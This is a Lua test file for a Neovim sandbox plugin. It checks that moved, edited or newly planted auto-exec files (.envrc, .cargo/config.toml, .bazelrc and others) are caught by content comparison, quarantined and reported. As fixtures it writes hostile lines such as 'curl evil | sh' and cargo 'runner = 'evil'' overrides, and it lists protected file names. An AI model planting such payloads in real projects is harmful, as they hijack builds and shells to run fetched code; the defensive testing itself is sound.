-- Eighth round: the sweep compares CONTENT (a moved protected name, an existing one changed deep in the tree),
-- more auto-exec names, a quarantine that survives chmod 555 parents, nested skipped directories and the exact
-- subdirectory mount budget (the runner, the proxy and the scan have their own round8_*_spec.lua files).
local H = require("xynotest.helpers")
local sb = require("xyno_sandbox")
local plan = require("xyno_sandbox.plan")
local guard = require("xyno_sandbox.guard")
local store = require("xyno_sandbox.store")
local uv = vim.uv

local saved = vim.deepcopy(sb.config)
before_each(function()
  store.dir_override = H.tmpdir() .. "/state"
end)
after_each(function()
  store.dir_override = nil
  sb.config = vim.deepcopy(saved)
end)

local function write(path, text)
  vim.fn.mkdir(vim.fs.dirname(path), "p")
  local f = assert(io.open(path, "wb"))
  f:write(text or "x\n")
  f:close()
end

local function rel_list(project, paths)
  local out = {}
  for _, p in ipairs(paths) do
    out[#out + 1] = p:sub(#project + 2)
  end
  return out
end

local function inside(project, script)
  H.need_sandbox()
  sb.config.network = "open"
  local cmd, err, h = sb.wrap({ "bash", "-c", script }, project, H.tmpdir())
  H.ok(cmd, err)
  local r = vim.system(cmd, { cwd = project, text = true }):wait(60000)
  h.release()
  return (r.stdout or "") .. (r.stderr or "")
end

-- a wrap() whose launch snapshot is taken, then the project is changed from outside (what a run could have done
-- below the mask depth), then the run ends
local function launch(project)
  H.need_sandbox()
  sb.config.network = "open"
  local cmd, err, h = sb.wrap({ "true" }, project, H.tmpdir())
  H.ok(cmd, err)
  return h
end

local function set_time(path, sec)
  uv.fs_utime(path, sec, sec)
end

-- ------------------------------------------------------------------ (1) a moved protected name: its content is compared
describe("a protected name that was moved is compared by content, not trusted by inode", function()
  it("a renamed directory with a replaced .cargo/config.toml inside is reported with a diff", function()
    local project = H.tmpdir()
    write(project .. "/sub/.cargo/config.toml", "[build]\njobs = 2\n")
    local before = guard.snapshot(project)
    os.rename(project .. "/sub", project .. "/sub_old")
    write(project .. "/sub_old/.cargo/config.toml", "[target.x86_64-unknown-linux-gnu]\nrunner = 'evil'\n")
    local res = guard.compare(before, guard.snapshot(project))
    H.eq(1, #res.tampered, vim.inspect(res))
    H.eq(project .. "/sub/.cargo", res.tampered[1].from)
    H.eq(project .. "/sub_old/.cargo", res.tampered[1].to)
    H.eq(2, res.tampered[1].plus)
    H.eq(2, res.tampered[1].minus)
    H.eq({}, res.planted)
  end)

  it("a file added inside a moved directory is reported", function()
    local project = H.tmpdir()
    write(project .. "/sub/.cargo/config.toml", "[build]\n")
    local before = guard.snapshot(project)
    os.rename(project .. "/sub", project .. "/elsewhere")
    write(project .. "/elsewhere/.cargo/extra.toml", "runner = 'evil'\n")
    local res = guard.compare(before, guard.snapshot(project))
    H.eq(1, #res.tampered, vim.inspect(res))
    H.eq(project .. "/elsewhere/.cargo", res.tampered[1].to)
  end)

  it("a protected FILE moved to another directory with other content is reported", function()
    local project = H.tmpdir()
    write(project .. "/a/.envrc", "echo hi\n")
    vim.fn.mkdir(project .. "/b", "p")
    local before = guard.snapshot(project)
    os.rename(project .. "/a/.envrc", project .. "/b/.envrc")
    write(project .. "/b/.envrc", "curl evil | sh\n") -- same inode, new content
    local res = guard.compare(before, guard.snapshot(project))
    H.eq(1, #res.tampered, vim.inspect(res))
    H.eq(project .. "/b/.envrc", res.tampered[1].to)
    H.eq({}, res.planted)
  end)

  it("a plain rename with the same content is only 'moved'", function()
    local project = H.tmpdir()
    write(project .. "/sub/.cargo/config.toml", "[build]\n")
    write(project .. "/sub/.envrc", "x\n")
    local before = guard.snapshot(project)
    os.rename(project .. "/sub", project .. "/sub_old")
    local res = guard.compare(before, guard.snapshot(project))
    H.eq(2, #res.moved)
    H.eq({}, res.tampered)
    H.eq({}, res.planted)
    H.eq({}, res.modified)
  end)

  it("the end of the run marks the project and says what changed", function()
    local project = H.tmpdir()
    write(project .. "/sub/.cargo/config.toml", "[build]\n")
    local h = launch(project)
    os.rename(project .. "/sub", project .. "/sub_old")
    write(project .. "/sub_old/.cargo/config.toml", "[build]\nrunner = 'evil'\n")
    local notes = {}
    local old = vim.notify
    vim.notify = function(m, l)
      notes[#notes + 1] = { m, l }
    end
    h.release()
    vim.notify = old
    local rec = sb.dirty(project)
    H.ok(rec, "the project is marked")
    H.eq(1, #h.tampered)
    local text = vim.inspect(notes)
    H.match(text, "sub_old/.cargo", true)
    H.match(text, "+1 -0", true)
    sb.clear_dirty(project)
  end)
end)

-- ------------------------------------------------------------------ (3) an existing protected file that changed
describe("an existing protected file that changed is reported whatever its mtime says", function()
  it("same size, mtime put back: found by content", function()
    local project = H.tmpdir()
    write(project .. "/deep/er/.envrc", "AAAA\n")
    set_time(project .. "/deep/er/.envrc", 1700000000)
    local before = guard.snapshot(project)
    write(project .. "/deep/er/.envrc", "BBBB\n")
    set_time(project .. "/deep/er/.envrc", 1700000000)
    local res = guard.compare(before, guard.snapshot(project))
    H.eq({ project .. "/deep/er/.envrc" }, res.modified)
    H.eq(1, res.details[project .. "/deep/er/.envrc"].plus)
    H.eq(1, res.details[project .. "/deep/er/.envrc"].minus)
  end)

  it("the report names the file with lines added and removed", function()
    local project = H.tmpdir()
    write(project .. "/d/.envrc", "a\nb\n")
    local before = guard.snapshot(project)
    write(project .. "/d/.envrc", "a\nb\nc\nd\n")
    local lines = guard.report(guard.compare(before, guard.snapshot(project)))
    H.eq(1, #lines)
    H.match(lines[1], "/d/.envrc +2 -0", true)
  end)

  it("an unchanged file, and a file only touched, is not reported as edited", function()
    local project = H.tmpdir()
    write(project .. "/d/.envrc", "a\n")
    local before = guard.snapshot(project)
    local res = guard.compare(before, guard.snapshot(project))
    H.eq({}, res.modified)
    H.eq({}, res.tampered)
  end)

  it("at the end of a run it is a loud notice (ERROR level)", function()
    local project = H.tmpdir()
    write(project .. "/d/e/f/.envrc", "a\n")
    local h = launch(project)
    write(project .. "/d/e/f/.envrc", "b\n")
    local notes = {}
    local old = vim.notify
    vim.notify = function(m, l)
      notes[#notes + 1] = { m, l }
    end
    h.release()
    vim.notify = old
    local found
    for _, n in ipairs(notes) do
      if n[1]:find("d/e/f/.envrc", 1, true) and n[2] == vim.log.levels.ERROR then
        found = true
      end
    end
    H.ok(found, vim.inspect(notes))
  end)
end)

-- ------------------------------------------------------------------ (5) a planted non-empty read-only file
describe("an empty leftover is deleted, a planted non-empty read-only file is quarantined", function()
  it("0444 with content is kept in the quarantine and the project is marked", function()
    local project = H.tmpdir()
    vim.fn.mkdir(project .. "/x/y", "p")
    local h = launch(project)
    write(project .. "/x/y/.envrc", "curl evil | sh\n")
    uv.fs_chmod(project .. "/x/y/.envrc", tonumber("444", 8))
    h.release()
    H.eq(nil, uv.fs_lstat(project .. "/x/y/.envrc"))
    H.ok(sb.dirty(project), "marked")
    H.ok(h.quarantine, "a quarantine directory")
    local f = io.open(h.quarantine .. "/x/y/.envrc", "rb")
    H.ok(f, "the copy exists")
    H.eq("curl evil | sh\n", f:read("a"))
    f:close()
    sb.clear_dirty(project)
  end)

  it("an empty 0444 file (the placeholder of a renamed directory) is removed without a mark", function()
    local project = H.tmpdir()
    vim.fn.mkdir(project .. "/x", "p")
    local h = launch(project)
    write(project .. "/x/.envrc", "")
    uv.fs_chmod(project .. "/x/.envrc", tonumber("444", 8))
    h.release()
    H.eq(nil, uv.fs_lstat(project .. "/x/.envrc"))
    H.eq(nil, sb.dirty(project))
  end)
end)

-- ------------------------------------------------------------------ (4) quarantine with read-only parents
describe("the quarantine copes with a planted name whose parents are read-only", function()
  local function modes(p)
    return bit.band(uv.fs_lstat(p).mode, tonumber("777", 8))
  end

  it("a 555 parent directory", function()
    local project = H.tmpdir()
    vim.fn.mkdir(project .. "/p", "p")
    local h = launch(project)
    write(project .. "/p/.envrc", "evil\n")
    uv.fs_chmod(project .. "/p", tonumber("555", 8))
    h.release()
    H.eq(nil, uv.fs_lstat(project .. "/p/.envrc"))
    H.eq(tonumber("555", 8), modes(project .. "/p"), "the parent's mode is put back")
    local d = sb.dirty(project)
    H.ok(d)
    H.eq({}, d.failed)
    uv.fs_chmod(project .. "/p", tonumber("755", 8))
    sb.clear_dirty(project)
  end)

  it("a planted directory with 555 and 000 directories inside", function()
    local project = H.tmpdir()
    vim.fn.mkdir(project .. "/p", "p")
    local h = launch(project)
    write(project .. "/p/.cargo/in/config.toml", "runner = 'evil'\n")
    write(project .. "/p/.cargo/top.toml", "evil\n")
    uv.fs_chmod(project .. "/p/.cargo/in", tonumber("555", 8))
    uv.fs_chmod(project .. "/p/.cargo/top.toml", tonumber("000", 8))
    uv.fs_chmod(project .. "/p/.cargo", tonumber("555", 8))
    h.release()
    H.eq(nil, uv.fs_lstat(project .. "/p/.cargo"))
    local f = io.open(h.quarantine .. "/p/.cargo/in/config.toml", "rb")
    H.ok(f, "copied although unreadable directories had to be opened first")
    f:close()
    H.ok(io.open(h.quarantine .. "/p/.cargo/top.toml", "rb"), "a 000 file is copied too")
    H.eq({}, sb.dirty(project).failed)
    sb.clear_dirty(project)
  end)

  it("a directory that cannot be freed is named in the notice and in the mark", function()
    local project = H.tmpdir()
    vim.fn.mkdir(project .. "/p", "p")
    local h = launch(project)
    write(project .. "/p/.envrc", "evil\n")
    local orig = vim.fn.delete
    -- (a parent the agent made immutable is something chmod cannot undo: simulate by failing every delete)
    local old = guard._delete
    guard._delete = function()
      return -1
    end
    local notes = {}
    local oldn = vim.notify
    vim.notify = function(m, l)
      notes[#notes + 1] = m
    end
    h.release()
    vim.notify = oldn
    guard._delete = old
    H.eq(orig, vim.fn.delete)
    H.match(table.concat(notes, "\n"), "COULD NOT REMOVE", true)
    H.eq({ project .. "/p/.envrc" }, sb.dirty(project).failed)
    os.remove(project .. "/p/.envrc")
    sb.clear_dirty(project)
  end)
end)

-- ------------------------------------------------------------------ (6) skipped directories inside skipped directories
describe("a skipped directory nested in a skipped directory is entered in the second pass", function()
  it("target/ inside node_modules/ inside target/ with a planted name three levels down", function()
    local project = H.tmpdir()
    vim.fn.mkdir(project .. "/target/a/node_modules/b/target/c", "p")
    local before = guard.snapshot(project)
    write(project .. "/target/a/node_modules/b/target/c/.envrc", "evil\n")
    write(project .. "/target/a/node_modules/b/.cargo/config.toml", "evil\n")
    local res = guard.compare(before, guard.snapshot(project))
    H.eq(
      { "target/a/node_modules/b/.cargo", "target/a/node_modules/b/target/c/.envrc" },
      rel_list(project, res.planted)
    )
  end)

  it("they are counted against the second budget, not skipped", function()
    local project = H.tmpdir()
    vim.fn.mkdir(project .. "/node_modules/a/node_modules/b", "p")
    local snap = guard.snapshot(project)
    H.eq(4, snap.skip_dirs) -- node_modules, a, node_modules, b
  end)
end)

-- ------------------------------------------------------------------ (2) more auto-exec names
describe("round 8 names: covered or reviewed", function()
  local LOCKED = {
    ".devcontainer.json",
    ".bazelrc",
    ".bazelversion",
    ".bazeliskrc",
    ".lefthook",
    ".cargo-husky",
    ".sbtopts",
    ".jvmopts",
    ".bundle",
  }
  local REVIEW = {
    "lefthook-local.yml",
    "gradle.properties",
    "gradle-wrapper.properties",
    "build.gradle",
    "build.gradle.kts",
    "settings.gradle",
    "pom.xml",
    "build.sbt",
    "Gemfile",
    "Rakefile",
    ".rspec",
    "Procfile",
    ".nvmrc",
    ".node-version",
    ".python-version",
    ".ruby-version",
    ".gitattributes",
    ".tmuxp.yaml",
    ".tmuxinator.yml",
    "gradlew",
    "mvnw",
  }
  it("the tables name them (written out here)", function()
    for _, n in ipairs(LOCKED) do
      H.ok(vim.tbl_contains(plan.PROJECT_READONLY, n), "PROJECT_READONLY " .. n)
      H.ok(vim.tbl_contains(plan.MEMBER_READONLY, n), "MEMBER_READONLY " .. n)
      H.ok(vim.tbl_contains(plan.WATCH_NAMES, n), "WATCH_NAMES " .. n)
    end
    H.ok(vim.tbl_contains(plan.MEMBER_READONLY, ".gitmodules"))
    for _, n in ipairs(REVIEW) do
      H.ok(vim.tbl_contains(plan.REVIEW_NAMES, n), "REVIEW_NAMES " .. n)
    end
  end)

  it("real run: a present one is read-only at the root and in a subdirectory", function()
    H.need_sandbox()
    local project = H.tmpdir()
    local lines = {}
    for _, n in ipairs(LOCKED) do
      local dir = (n == ".lefthook" or n == ".cargo-husky" or n == ".bundle")
      for _, base in ipairs({ project, project .. "/sub" }) do
        if dir then
          vim.fn.mkdir(base .. "/" .. n, "p")
          write(base .. "/" .. n .. "/x")
          lines[#lines + 1] = ("echo pwn > '%s/%s/new' 2>/dev/null && echo WRITABLE:%s/%s"):format(base, n, base, n)
        else
          write(base .. "/" .. n, "orig\n")
          lines[#lines + 1] = ("echo pwn >> '%s/%s' 2>/dev/null && echo WRITABLE:%s/%s"):format(base, n, base, n)
        end
      end
    end
    local out = inside(project, table.concat(lines, "\n") .. "\necho DONE")
    H.match(out, "DONE", true, out)
    H.no_match(out, "WRITABLE", true, out)
  end)

  it("a copy planted in a deep directory is found by the sweep", function()
    local project = H.tmpdir()
    vim.fn.mkdir(project .. "/a/b/c/d", "p")
    local before = guard.snapshot(project)
    for _, n in ipairs({ ".bazelrc", ".devcontainer.json", ".sbtopts" }) do
      write(project .. "/a/b/c/d/" .. n, "evil\n")
    end
    vim.fn.mkdir(project .. "/a/b/c/d/.lefthook/pre-commit", "p")
    local res = guard.compare(before, guard.snapshot(project))
    H.eq(
      { "a/b/c/d/.bazelrc", "a/b/c/d/.devcontainer.json", "a/b/c/d/.lefthook", "a/b/c/d/.sbtopts" },
      rel_list(project, res.planted)
    )
  end)
end)

-- ------------------------------------------------------------------ (8) the subdirectory mount budget
local PROJECT, TMP, FHOME = "/h/proj", "/h/scratch", "/h"
local function fakefs(entries)
  return {
    stat_type = function(x)
      return entries[x]
    end,
    lstat_type = function(x)
      return entries[x]
    end,
    exists = function(x)
      return entries[x] ~= nil
    end,
    list = function(dir)
      local out, prefix = {}, dir == "/" and "/" or (dir .. "/")
      for x, t in pairs(entries) do
        if x:sub(1, #prefix) == prefix and not x:sub(#prefix + 1):find("/", 1, true) then
          out[#out + 1] = { x:sub(#prefix + 1), t }
        end
      end
      table.sort(out, function(a, b)
        return a[1] < b[1]
      end)
      return out
    end,
    glob = function()
      return {}
    end,
    read_line = function()
      return nil
    end,
    realpath = function(x)
      return entries[x] and x or nil
    end,
    stat_info = function()
      return nil
    end,
  }
end
local function build(extra)
  local entries = vim.tbl_extend("force", {
    [FHOME] = "directory",
    [FHOME .. "/.claude"] = "directory",
    [PROJECT] = "directory",
    [TMP] = "directory",
    [PROJECT .. "/.git"] = "directory",
  }, extra or {})
  return plan.build({
    project = PROJECT,
    tmp_dir = TMP,
    cwd = PROJECT,
    home = FHOME,
    uid = 1000,
    probes = fakefs(entries),
    env = { PATH = "/usr/bin" },
    cmd = { "agent" },
    aux = { empty = "/aux/empty", claude_json = "/aux/cj", git_dir = "/aux/git" },
    config = { network = "open" },
  })
end

describe("the subdirectory mount budget is exact and ordered", function()
  local DIRS = { "/.cargo", "/.claude", "/.vscode", "/.git" }
  local FILES_ = {
    "/.envrc",
    "/.mcp.json",
    "/.nvim.lua",
    "/.mise.toml",
    "/.exrc",
    "/.npmrc",
    "/.yarnrc.yml",
    "/.dir-locals.el",
    "/.lvimrc",
  }
  local PER_DIR = #DIRS + #FILES_
  local function with_max(n, extra)
    local old = plan.SUBDIR_MASK_MAX
    plan.SUBDIR_MASK_MAX = n
    local ok, p = pcall(build, extra)
    plan.SUBDIR_MASK_MAX = old
    assert(ok, p)
    local covered_ = {}
    for _, m in ipairs(p.masks) do
      covered_[m.path] = true
    end
    for _, g in ipairs(p.guard_files) do
      covered_[g.path] = true
    end
    return p, covered_
  end
  local TREE = {
    [PROJECT .. "/d1"] = "directory",
    [PROJECT .. "/d2"] = "directory",
    [PROJECT .. "/d1/deep"] = "directory",
  }

  it("the names are what this spec counts with", function()
    H.eq(
      DIRS,
      vim.tbl_map(function(n)
        return "/" .. n
      end, plan.SUBDIR_MASK_DIRS)
    )
    H.eq(PER_DIR, 13)
  end)

  it("a budget of N gives exactly N mounts (not N+1, not N-1)", function()
    for _, n in ipairs({ 1, 5, 13 }) do
      local p = with_max(n, TREE)
      H.eq(n, p.subdir_masks, "budget " .. n)
    end
  end)

  it("a budget of 0 gives none", function()
    local p, c = with_max(0, TREE)
    H.eq(0, p.subdir_masks)
    H.not_ok(c[PROJECT .. "/d1/.claude"])
  end)

  it("a budget that fits two directories covers both, the third (deeper) gets nothing", function()
    local p, c = with_max(2 * PER_DIR, TREE)
    H.eq(2 * PER_DIR, p.subdir_masks)
    for _, n in ipairs({ "d1", "d2" }) do
      for _, rel in ipairs(DIRS) do
        H.ok(c[PROJECT .. "/" .. n .. rel], n .. rel)
      end
      for _, rel in ipairs(FILES_) do
        H.ok(c[PROJECT .. "/" .. n .. rel], n .. rel)
      end
    end
    H.not_ok(c[PROJECT .. "/d1/deep/.cargo"], "the deeper directory is last")
  end)

  it("one more mount goes to the deeper directory, starting with .cargo", function()
    local p, c = with_max(2 * PER_DIR + 1, TREE)
    H.eq(2 * PER_DIR + 1, p.subdir_masks)
    H.ok(c[PROJECT .. "/d1/deep/.cargo"])
    H.not_ok(c[PROJECT .. "/d1/deep/.claude"])
  end)

  it("with equal depth the listing order decides: d1 is covered before d2", function()
    local p, c = with_max(PER_DIR, TREE)
    H.ok(c[PROJECT .. "/d1/.cargo"] and c[PROJECT .. "/d1/.lvimrc"])
    H.not_ok(c[PROJECT .. "/d2/.cargo"])
  end)

  it("an existing name takes no mount from the budget", function()
    local extra =
      vim.tbl_extend("force", TREE, { [PROJECT .. "/d1/.claude"] = "directory", [PROJECT .. "/d1/.envrc"] = "file" })
    local p = with_max(PER_DIR, extra)
    H.eq(PER_DIR, p.subdir_masks)
    H.ok(select(2, with_max(PER_DIR, extra))[PROJECT .. "/d2/.cargo"], "the two that exist leave room for d2's first")
  end)
end)

describe("the README and the help name what round 8 added", function()
  local text = H.docs_text()
  it("every locked and reviewed name is in the docs", function()
    for _, n in ipairs({
      ".devcontainer.json",
      ".bazelrc",
      ".bazelversion",
      ".bazeliskrc",
      ".lefthook",
      ".cargo-husky",
      ".sbtopts",
      ".jvmopts",
      ".bundle",
      "gradle.properties",
      "pom.xml",
      "Gemfile",
      "Procfile",
      ".nvmrc",
      ".python-version",
      ".gitattributes",
      "tampered",
    }) do
      H.match(text, n, true, n)
    end
  end)
end)
